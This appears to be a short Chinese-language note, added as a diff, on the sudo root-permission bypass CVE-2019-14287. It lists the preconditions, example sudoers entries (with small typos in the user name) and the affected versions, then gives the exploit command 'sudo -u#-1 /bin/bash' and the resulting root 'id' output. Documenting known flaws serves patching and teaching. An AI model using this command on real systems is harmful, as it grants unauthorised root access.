@@ -1,0 +1,17 @@
+linux sudo root 权限绕过漏洞(CVE-2019-14287)
+限制条件
+1.知道当前普通用户的密码
+
+2.当前普通用户在souduers文件中
+
+3.本地提权需要本地操作 估计远程ssh连接的终端会失败
+4.需要root 修改sudoers 文件授权 
+gaotest ALL=(ALL)       ALL
+gaotext ALL=(ALL,!root) /usr/bin/vim
+gaotext ALL=(ALL,!root) /usr/bin/bash
+影响版本 sudo -V 
+1.8.28之前的sudo版本均会受到影响
+普通用户 执行 sudo -u#-1 /bin/bash 后直接切换到root权限
+
+bash-4.2# id
+uid=0(root) gid=1002(gaotest) groups=1002(gaotest)
